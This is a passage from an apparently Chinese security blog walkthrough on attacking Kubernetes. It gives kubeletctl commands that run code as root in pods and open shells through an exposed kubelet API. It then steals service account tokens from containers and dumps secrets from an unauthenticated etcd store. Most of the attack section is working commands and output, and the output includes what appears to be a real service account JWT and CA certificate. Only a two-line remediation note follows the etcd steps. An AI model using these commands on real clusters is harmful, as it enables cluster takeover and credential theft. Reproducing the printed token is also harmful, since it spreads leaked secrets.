  You can view examples from each command by using the -h\--help flag like that: kubeletctl run -h
  Examples:
    // List all pods from kubelet
    kubeletctl pods --server 123.123.123.123

    // List all pods from kubelet with token
    kubeletctl pods --token &lt;JWT_token> --server 123.123.123.123

    // List all pods from kubelet with token file
    kubeletctl pods --token-file /var/run/secrets/kubernetes.io/serviceaccount/token --server 123.123.123.123

    // Searching for service account token in each accessible container
    kubeletctl scan token --server 123.123.123.123

    // Searching for pods/containers vulnerable to RCE
    kubeletctl scan rce --server 123.123.123.123

    // Run "ls /" command on pod my-nginx-pod/nginx in thedefault namespace
    kubeletctl run "ls /" --namespace default --pod my-nginx-pod --container nginx --server 123.123.123.123

    // Run "ls /" command on all existing pods in a node
    kubeletctl.exe run "ls /" --all-pods --server 123.123.123.123

    // With certificates
    kubeletctl.exe pods -s &lt;node_ip> --cacert C:\Users\myuser\certs\ca.crt --cert C:\Users\myuser\certs\kubelet-client-current.pem --key C:\Users\myuser\certs\kubelet-client-current.pem

Usage:
  kubeletctl [flags]
  kubeletctl [command]

Available Commands:
  attach        Attach to a container
  configz       Return kubelet'</span>s configuration.
  containerLogs Return container log
  cri           Run commands inside a container through the Container Runtime Interface <span class="token punctuation">(</span>CRI<span class="token punctuation">)</span>
  debug         Return debug information <span class="token punctuation">(</span>pprof or flags<span class="token punctuation">)</span>
  <span class="token function">exec</span>          Run commands inside a container
  healthz       Check the state of the node
  <span class="token function">help</span>          Help about any <span class="token function">command</span>
  log           Return the log from the node.
  metrics       Return resource usage metrics <span class="token punctuation">(</span>such as container CPU, memory usage, etc.<span class="token punctuation">)</span>
  pods          Get list of pods on the node
  portForward   Attach to a container
  run           Run commands inside a container
  runningpods   Returns all pods running on kubelet from looking at the container runtime cache.
  scan          Scans <span class="token keyword">for</span> nodes with opened kubelet API
  spec          Cached MachineInfo returned by cadvisor
  stats         Return statistical information <span class="token keyword">for</span> the resources <span class="token keyword">in</span> the node.
  version       Print the version of the kubeletctl

Flags:
      --cacert string       CA certificate <span class="token punctuation">(</span>example: /etc/kubernetes/pki/ca.crt <span class="token punctuation">)</span>
      --cert string         Private key <span class="token punctuation">(</span>example: /var/lib/kubelet/pki/kubelet-client-current.pem<span class="token punctuation">)</span>
      --cidr string         A network of IP addresses <span class="token punctuation">(</span>Example: x.x.x.x/24<span class="token punctuation">)</span>
  -k, --config string       KubeConfig <span class="token function">file</span>
  -c, --container string    Container name
  -h, --help                <span class="token function">help</span> <span class="token keyword">for</span> kubeletctl
      --http                Use HTTP <span class="token punctuation">(</span>default is HTTPS<span class="token punctuation">)</span>
  -i, --ignoreconfig        Ignore the default KUBECONFIG environment variable or location ~/.kube
      --key string          Digital certificate <span class="token punctuation">(</span>example: /var/lib/kubelet/pki/kubelet-client-current.pem<span class="token punctuation">)</span>
  -n, --namespace string    pod namespace
  -p, --pod string          Pod name
      --port string         Kubelet's port, default is 10250
  -r, --raw                 Prints raw data
  -s, --server string       Server address <span class="token punctuation">(</span>format: x.x.x.x. For Example: 123.123.123.123<span class="token punctuation">)</span>
  -t, --token string        Service account Token <span class="token punctuation">(</span>JWT<span class="token punctuation">)</span> to insert
  -f, --token-file string   Service account Token <span class="token punctuation">(</span>JWT<span class="token punctuation">)</span> <span class="token function">file</span> path
  -u, --uid string          Pod UID

Use <span class="token string">"kubeletctl [command] --help"</span> <span class="token keyword">for</span> <span class="token function">more</span> information about a command.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注：<code>scan</code> 子模块可扫描探测网络段 <code>kubelet api</code> 脆弱性</p>
<ul>
<li>获取 <code>pod</code> 及所有 <code>container</code></li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubeletctl.exe -s kubelet_node_ip pods
┌─────────────────────────────────────────────────────────────┐
│                        Pods from Kubelet                    │
├───┬─────────────────────────────┬─────────────┬─────────────┤
│   │ POD                         │ NAMESPACE   │ CONTAINERS  │
├───┼─────────────────────────────┼─────────────┼─────────────┤
│ 1 │ calico-node-np9hg           │ kube-system │ calico-node │
│   │                             │             │             │
├───┼─────────────────────────────┼─────────────┼─────────────┤
│ 2 │ kong-proxy-57b6fb6b77-m88fl │ oort-apaas  │ kong-proxy  │
│   │                             │             │             │
└───┴─────────────────────────────┴─────────────┴─────────────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>执行任意命令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># run 接口</span>
λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubeletctl.exe -s kubelet_node_ip run -n oort-apaas -p kong-proxy-57b6fb6b77-m88fl -c kong-proxy <span class="token string">"whoami"</span>
root

<span class="token comment" spellcheck="true"># exec 接口</span>
λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubeletctl.exe -s kubelet_node_ip <span class="token function">exec</span> -n oort-apaas -p kong-proxy-57b6fb6b77-m88fl -c kong-proxy <span class="token string">"whoami"</span>
root
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>获取交互 <code>shell</code></li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># run 接口</span>
λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubeletctl.exe -s kubelet_node_ip run -n oort-apaas -p kong-proxy-57b6fb6b77-m88fl -c kong-proxy <span class="token string">"sh"</span>
返回空<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token comment" spellcheck="true"># exec 接口</span>
λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubeletctl.exe -s kubelet_node_ip <span class="token function">exec</span> -n oort-apaas -p kong-proxy-57b6fb6b77-m88fl -c kong-proxy <span class="token string">"sh"</span>
/ <span class="token comment" spellcheck="true"># whoami</span>
<span class="token function">whoami</span>
root
/ <span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>攻击 <code>Kubernetes Api</code> (<code>master node</code>)</li>
</ul>
<p>通过 <code>kubelet api</code> (<code>worker node</code>) 攻击 <code>kubernetes api</code> 需要满足两个条件：1、知道 <code>kubernetes api</code> 地址并可访问；2、具有认证 <code>kubernetes api</code> 权限的 <code>serviceaccount token</code> </p>
<p>（1）获取 <code>kubernetes api address</code></p>
<p>一般通过<code>kubelet api</code> (<code>worker node</code>) 在<code>container</code>中查看环境变量进行获取</p>
<pre class="line-numbers language-bash"><code class="language-bash">λ Qftm <span class="token operator">>></span><span class="token operator">></span>: kubeletctl -s 116.239.33.51 <span class="token function">exec</span> -n oort-apaas -p kong-proxy-57b6fb6b77-m88fl -c kong-proxy <span class="token string">"env"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"KUBERNETES"</span>
KUBERNETES_SERVICE_PORT<span class="token operator">=</span>443
KUBERNETES_PORT_443_TCP<span class="token operator">=</span>tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST<span class="token operator">=</span>10.96.0.1
KUBERNETES_PORT_443_TCP_PROTO<span class="token operator">=</span>tcp
KUBERNETES_PORT_443_TCP_PORT<span class="token operator">=</span>443
KUBERNETES_PORT<span class="token operator">=</span>tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_ADDR<span class="token operator">=</span>10.96.0.1
KUBERNETES_SERVICE_PORT_HTTPS<span class="token operator">=</span>443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>（2）获取 <code>serviceaccount</code> <code>token</code> </p>
<p>不同命名空间下的  <code>serviceaccount token</code> 权限不一样，尽量选择权限大一点的（例如：<code>kube-admin</code>、<code>kube-system</code> 等）</p>
<p>第一步，获取 <code>serviceaccount</code> 地址</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20220309175545472-164735412549216.png" alt="image-20220309175545472"></p>
<p>第二步，读取特定 <code>container</code> 中的 <code>serviceaccount</code> <code>token</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubeletctl.exe -s kubelet_node_ip <span class="token function">exec</span> -n kube-system -p csi-lvm-provisioner-0 -c csi-provisioner <span class="token string">"cat /var/run/secrets/kubernetes.io/serviceaccount/token"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>（3）攻击 <code>kubernetes api</code> </p>
<p>携带认证访问 <code>kubernetes api</code> </p>
<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: curl -k -H <span class="token string">"Authorization: Bearer &lt;JWT_TOKEN>"</span> https://<span class="token operator">&lt;</span>Kubernetes_API_IP<span class="token operator">></span>:<span class="token operator">&lt;</span>port<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>利用 <code>kubectl</code> 攻击</p>
<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubectl --insecure-skip-tls-verify<span class="token operator">=</span>true -s <span class="token string">"https://ip:6443"</span> --token<span class="token operator">=</span><span class="token string">"&lt;JWT_TOKEN>"</span> <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Attack-Kube-proxy"><a href="#Attack-Kube-proxy" class="headerlink" title="Attack Kube-proxy"></a>Attack Kube-proxy</h2><blockquote>
<p>每台Worker机器上都运行一个 kube-proxy 服务，它监听 API server 中 service 和 endpoint 的变化情况，并通过userspace、iptables、ipvs 或 winuserspace 等 proxier 来为服务配置负载均衡（仅支持 TCP 和 UDP）。</p>
</blockquote>
<p>如果集群存在内网服务，业务或开发为了方便访问或调试，通过 <code>kubectl proxy --address=0.0.0.0</code> 子命令，将 <code>kube-apiserver</code> 转发暴露到 <code>0.0.0.0</code>上，而且默认不存在鉴权，后面接管 <code>kube-apiserver</code> 集集群如同 <code>Attack Kube</code> 部分。</p>
<h2 id="Attack-Etcd"><a href="#Attack-Etcd" class="headerlink" title="Attack Etcd"></a>Attack Etcd</h2><p><code>Kubernetes</code> 集群默认使用 <code>Etcd v3</code> 高可用键值数据库来存储集群状态和配置信息，用于服务发现和集群管理，默认使用<code>2379</code>端口提供<code>HTTP API</code>服务口。</p>
<p>在配置不当（未做基于角色的<code>Basic</code>访问控制或<code>TLS</code>认证）的情况下，通过暴露的公网或<code>SSRF</code>利用下未授权窃取特定的认证数据，接管 <code>Kubernetes</code> 集群。</p>
<h3 id="Port-2379"><a href="#Port-2379" class="headerlink" title="Port 2379"></a>Port 2379</h3><p>Etcd v2 和 v3 是两套不兼容的 API，实际利用过程存在差异。官方提供了 <a href="https://github.com/etcd-io/etcd" target="_blank" rel="noopener">etcdctl</a> 远端管理工具</p>
<pre class="line-numbers language-bash"><code class="language-bash">λ Qftm <span class="token operator">>></span><span class="token operator">></span>: etcdctl -h
NAME:
        etcdctl - A simple <span class="token function">command</span> line client <span class="token keyword">for</span> etcd3.

USAGE:
        etcdctl <span class="token punctuation">[</span>flags<span class="token punctuation">]</span>

VERSION:
        3.5.0

API VERSION:
        3.5


COMMANDS:
        alarm disarm            Disarms all alarms
        alarm list              Lists all alarms
        auth disable            Disables authentication
        auth <span class="token function">enable</span>             Enables authentication
        auth status             Returns authentication status
        check datascale         Check the memory usage of holding data <span class="token keyword">for</span> different workloads on a given server endpoint.
        check perf              Check the performance of the etcd cluster
        compaction              Compacts the event <span class="token function">history</span> <span class="token keyword">in</span> etcd
        defrag                  Defragments the storage of the etcd members with given endpoints
        del                     Removes the specified key or range of keys <span class="token punctuation">[</span>key, range_end<span class="token punctuation">)</span>
        elect                   Observes and participates <span class="token keyword">in</span> leader election
        endpoint hashkv         Prints the KV <span class="token function">history</span> <span class="token function">hash</span> <span class="token keyword">for</span> each endpoint <span class="token keyword">in</span> --endpoints
        endpoint health         Checks the healthiness of endpoints specified <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span>--endpoints<span class="token variable">`</span></span> flag
        endpoint status         Prints out the status of endpoints specified <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span>--endpoints<span class="token variable">`</span></span> flag
        get                     Gets the key or a range of keys
        <span class="token function">help</span>                    Help about any <span class="token function">command</span>
        lease grant             Creates leases
        lease keep-alive        Keeps leases alive <span class="token punctuation">(</span>renew<span class="token punctuation">)</span>
        lease list              List all active leases
        lease revoke            Revokes leases
        lease timetolive        Get lease information
        lock                    Acquires a named lock
        make-mirror             Makes a mirror at the destination etcd cluster
        member add              Adds a member into the cluster
        member list             Lists all members <span class="token keyword">in</span> the cluster
        member promote          Promotes a non-voting member <span class="token keyword">in</span> the cluster
        member remove           Removes a member from the cluster
        member update           Updates a member <span class="token keyword">in</span> the cluster
        move-leader             Transfers leadership to another etcd cluster member.
        put                     Puts the given key into the store
        role add                Adds a new role
        role delete             Deletes a role
        role get                Gets detailed information of a role
        role grant-permission   Grants a key to a role
        role list               Lists all roles
        role revoke-permission  Revokes a key from a role
        snapshot restore        Restores an etcd member snapshot to an etcd directory
        snapshot save           Stores an etcd node backend snapshot to a given <span class="token function">file</span>
        snapshot status         <span class="token punctuation">[</span>deprecated<span class="token punctuation">]</span> Gets backend snapshot status of a given <span class="token function">file</span>
        txn                     Txn processes all the requests <span class="token keyword">in</span> one transaction
        user add                Adds a new user
        user delete             Deletes a user
        user get                Gets detailed information of a user
        user grant-role         Grants a role to a user
        user list               Lists all <span class="token function">users</span>
        user <span class="token function">passwd</span>             Changes password of user
        user revoke-role        Revokes a role from a user
        version                 Prints the version of etcdctl
        <span class="token function">watch</span>                   Watches events stream on keys or prefixes

OPTIONS:
      --cacert<span class="token operator">=</span><span class="token string">""</span>                               verify certificates of TLS-enabled secure servers using this CA bundle
      --cert<span class="token operator">=</span><span class="token string">""</span>                                 identify secure client using this TLS certificate <span class="token function">file</span>
      --command-timeout<span class="token operator">=</span>5s                      <span class="token function">timeout</span> <span class="token keyword">for</span> short running <span class="token function">command</span> <span class="token punctuation">(</span>excluding dial timeout<span class="token punctuation">)</span>
      --debug<span class="token punctuation">[</span><span class="token operator">=</span>false<span class="token punctuation">]</span>                           <span class="token function">enable</span> client-side debug logging
      --dial-timeout<span class="token operator">=</span>2s                         dial <span class="token function">timeout</span> <span class="token keyword">for</span> client connections
  -d, --discovery-srv<span class="token operator">=</span><span class="token string">""</span>                        domain name to query <span class="token keyword">for</span> SRV records describing cluster endpoints
      --discovery-srv-name<span class="token operator">=</span><span class="token string">""</span>                   <span class="token function">service</span> name to query when using DNS discovery
      --endpoints<span class="token operator">=</span><span class="token punctuation">[</span>127.0.0.1:2379<span class="token punctuation">]</span>              gRPC endpoints
  -h, --help<span class="token punctuation">[</span><span class="token operator">=</span>false<span class="token punctuation">]</span>                            <span class="token function">help</span> <span class="token keyword">for</span> etcdctl
      --hex<span class="token punctuation">[</span><span class="token operator">=</span>false<span class="token punctuation">]</span>                             print byte strings as hex encoded strings
      --insecure-discovery<span class="token punctuation">[</span><span class="token operator">=</span>true<span class="token punctuation">]</span>               accept insecure SRV records describing cluster endpoints
      --insecure-skip-tls-verify<span class="token punctuation">[</span><span class="token operator">=</span>false<span class="token punctuation">]</span>        skip server certificate verification <span class="token punctuation">(</span>CAUTION: this option should be enabled only <span class="token keyword">for</span> testing purposes<span class="token punctuation">)</span>
      --insecure-transport<span class="token punctuation">[</span><span class="token operator">=</span>true<span class="token punctuation">]</span>               disable transport security <span class="token keyword">for</span> client connections
      --keepalive-time<span class="token operator">=</span>2s                       keepalive <span class="token function">time</span> <span class="token keyword">for</span> client connections
      --keepalive-timeout<span class="token operator">=</span>6s                    keepalive <span class="token function">timeout</span> <span class="token keyword">for</span> client connections
      --key<span class="token operator">=</span><span class="token string">""</span>                                  identify secure client using this TLS key <span class="token function">file</span>
      --password<span class="token operator">=</span><span class="token string">""</span>                             password <span class="token keyword">for</span> authentication <span class="token punctuation">(</span>if this option is used, --user option shouldn't include password<span class="token punctuation">)</span>
      --user<span class="token operator">=</span><span class="token string">""</span>                                 username<span class="token punctuation">[</span>:password<span class="token punctuation">]</span> <span class="token keyword">for</span> authentication <span class="token punctuation">(</span>prompt <span class="token keyword">if</span> password is not supplied<span class="token punctuation">)</span>
  -w, --write-out<span class="token operator">=</span><span class="token string">"simple"</span>                      <span class="token keyword">set</span> the output <span class="token function">format</span> <span class="token punctuation">(</span>fields, json, protobuf, simple, table<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>版本环境变量设置如下</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> ETCDCTL_API<span class="token operator">=</span>2
or
<span class="token function">export</span> ETCDCTL_API<span class="token operator">=</span>3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>v2</li>
</ul>
<p>通过浏览器或 <code>etcdctl</code> 可获取所有的 <code>key-value</code> 数据</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get version</span>
http://ip:2379/version
etcdctl --endpoints<span class="token operator">=</span><span class="token string">"http://ip:2379"</span> version

<span class="token comment" spellcheck="true"># get data</span>
http://ip:2379/v2/keys/?recursive<span class="token operator">=</span>true
etcdctl --endpoints<span class="token operator">=</span><span class="token string">"http://ip:2379"</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>v3</li>
</ul>
<p>获取相关版本、连接情况、基本使用</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get version</span>
http://ip:2379/version
etcdctl --endpoints<span class="token operator">=</span><span class="token string">"http://ip:2379"</span> version
etcdctl --insecure-transport<span class="token operator">=</span>false --insecure-skip-tls-verify --endpoints<span class="token operator">=</span><span class="token string">"https://ip:2379"</span> version

<span class="token comment" spellcheck="true"># get health</span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 endpoint health

<span class="token comment" spellcheck="true"># insert data</span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 put /xxxx/yyyy_key <span class="token string">"test_value"</span>

<span class="token comment" spellcheck="true"># get the value of the specified key /xxxx/yyyy_key </span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 get /xxxx/yyyy_key 

<span class="token comment" spellcheck="true"># delete key-value data</span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379del /xxxx/yyyy_key

<span class="token comment" spellcheck="true"># get all data(key、vaule) whose key is prefixed with "/" (e.g: key: /xxx/sss、/yyy)</span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 get / --prefix

<span class="token comment" spellcheck="true"># limit result count</span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 get / --prefix --limit<span class="token operator">=</span>5

<span class="token comment" spellcheck="true"># get all data(key) whose key is prefixed with "/"</span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 get / --prefix --keys-only

<span class="token comment" spellcheck="true"># list cluster all node</span>
etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 member list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>接管集群 <code>Kubernetes</code> 所需认证一般都在 <code>secrets</code> 相关 <code>key</code> 中存储</p>
<pre class="line-numbers language-bash"><code class="language-bash">λ Qftm <span class="token operator">>></span><span class="token operator">></span>: etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 get / --prefix --keys-only <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"secrets"</span>
/registry/secrets/default/default-token-g75tt
/registry/secrets/default/rc-token-b5hmq
/registry/secrets/default/reg
/registry/secrets/kube-node-lease/default-token-m5dvg
/registry/secrets/kube-public/default-token-fzxqn
/registry/secrets/kube-system/alibaba-log-controller-token-4nnfn
/registry/secrets/kube-system/attachdetach-controller-token-jjv9l
/registry/secrets/kube-system/certificate-controller-token-kr2d2
/registry/secrets/kube-system/clusterrole-aggregation-controller-token-qf8vv
/registry/secrets/kube-system/cronjob-controller-token-8526z
/registry/secrets/kube-system/daemon-set-controller-token-rhjqh
/registry/secrets/kube-system/default-token-wb4tv
/registry/secrets/kube-system/deployment-controller-token-n5qmg
/registry/secrets/kube-system/disruption-controller-token-gpwt5
/registry/secrets/kube-system/endpoint-controller-token-kftv8
/registry/secrets/kube-system/endpointslice-controller-token-brvpl
/registry/secrets/kube-system/expand-controller-token-gd6b7
/registry/secrets/kube-system/generic-garbage-collector-token-86hxv
/registry/secrets/kube-system/horizontal-pod-autoscaler-token-4jtkz
/registry/secrets/kube-system/job-controller-token-7s8v5
/registry/secrets/kube-system/k3s-serving
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对于 <code>secrets key</code> 中的 <code>token</code> 一般要选择权限大点的（e.g: <code>kube-system</code>等）</p>
<pre class="line-numbers language-bash"><code class="language-bash">λ Qftm <span class="token operator">>></span><span class="token operator">></span>: etcdctl --endpoints<span class="token operator">=</span>http://ip:2379 get /registry/secrets/kube-system/default-token-wb4tv
/registry/secrets/kube-system/default-token-wb4tv
k8s
♀
☻v1↕♠Secret↕�☼
�♥
‼default-token-wb4tv↕ →♂kube-system<span class="token string">" *<span class="token variable">$ff2f3fa8</span>-7fd1-48a0-be7a-8cb7ab5690fd2 8��Ĉ♠► b-
"</span>kubernetes.io/service-account.name↕defaultbI
<span class="token operator">!</span>kubernetes.io/service-account.uid↕<span class="token variable">$60148598</span>-5b33-4aa2-92e6-2e5f35d000c9z �☺�☺
♥k3s↕♠Update→☻v��Ĉ♠FieldsV1:�☺
�☺<span class="token punctuation">{</span><span class="token string">"f:data"</span>:<span class="token punctuation">{</span><span class="token string">"."</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"f:ca.crt"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"f:namespace"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"f:token"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span>,<span class="token string">"f:metadata"</span>:<span class="token punctuation">{</span><span class="token string">"f:annotations"</span>:<span class="token punctuation">{</span><span class="token string">"."</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"f:kubernetes.io/service-account.nam e"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"f:kubernetes.io/service-account.uid"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>,<span class="token string">"f:type"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span>↕�♦
♠ca.crt↕�♦-----BEGIN CERTIFICATE-----
MIIBVzCB/qADAgECAgEAMAoGCCqGSM49BAMCMCMxITAfBgNVBAMMGGszcy1zZXJ2
ZXItY2FAMTYyODUxMTg1NjAeFw0yMTA4MDkxMjI0MTZaFw0zMTA4MDcxMjI0MTZa
MCMxITAfBgNVBAMMGGszcy1zZXJ2ZXItY2FAMTYyODUxMTg1NjBZMBMGByqGSM49
AgEGCCqGSM49AwEHA0IABMmfebN6qv3iDeyuCnB3yKOKY+kETwbbC/BHW/hVk+l+
aFRHKp8QaCyNSLGmIrDDCJj87201VfOG0BKk4oeZQOKjIzAhMA4GA1UdDwEB/wQE
AwICpDAPBgNVHRMBAf8EBTADAQH/MAoGCCqGSM49BAMCA0gAMEUCIC8S1VoEnobY
J6fvCRFVr4MD0xq6h5yLjI37HNLtxsVSAiEAjPF6vSSIPPjbrHU28jfeOWSg3Kht
iMrD2/qzdqUbFAg<span class="token operator">=</span>
-----END CERTIFICATE-----
↕↑
        namespace↕♂kube-system↕�
♣token↕�eyJhbGciOiJSUzI1NiIsImtpZCI6ImVkMDVaZmhMaFVwbzREVUY4WEItMDNhRU1tNHQwNng4RndHeHhWSl8tZ1kifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2Nv dW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLXdiNHR2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2MDE0ODU5OC01YjMzLTRhYTItOTJlNi0yZTVmMzVkMDAwYzkiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVmYXVsdCJ9.xp-d68tJ1y0nXy_PvdXWQTlji-uf29UFtiyEw8__tzg5-JHf3gn1hPWKpxYU6r4fOtikPr3gZ1DAxnTHWuT7_qUdX-H2n64KlN6PRS_bEigtppjhKPHjiBhfowIQSgp-1Ex7KB-jMh0gOZ6I3VBCGyKc8amSOdLnXJCF64fwghlUkrPm39_ahDW2j3iA1ml0550WWS656UfbT1FoMiSirt3bDwIBTNz_qflQ45jOLcB2TJRM6PKd3Y3k_euTh-wXVn_fje4ShA_0MfcweONxTXqnlg4gSUDx8jkG0FeptL-QA__ij6676aBG3TtmurQhDBimX12oJJA5WQQVI7bvDQ→<span class="token comment" spellcheck="true">#kubernetes.io/service-account-token→ "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用窃取的特定认证接管 <code>Kubernetes</code> 集群</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># list api</span>
λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: curl -k -H <span class="token string">"Authorization: Bearer &lt;JWT_TOKEN>"</span> https://<span class="token operator">&lt;</span>Kubernetes_API_IP<span class="token operator">></span>:<span class="token operator">&lt;</span>port<span class="token operator">></span>

<span class="token comment" spellcheck="true"># kubectl exec command</span>
λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: kubectl --insecure-skip-tls-verify<span class="token operator">=</span>true -s <span class="token string">"https://ip:6443"</span> --token<span class="token operator">=</span><span class="token string">"&lt;JWT_TOKEN>"</span> <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>修复方案</li>
</ul>
<pre><code>1、Basic 认证（基于角色的访问控制）
2、基于 TLS 的身份验证和数据传输</code></pre><h2 id="Attack-Docker"><a href="#Attack-Docker" class="headerlink" title="Attack Docker"></a>Attack Docker</h2><p><code>Kubernetes</code> 微服务架构容器编排技术底层以 <code>docker</code> 虚拟化作为重要支撑。</p>
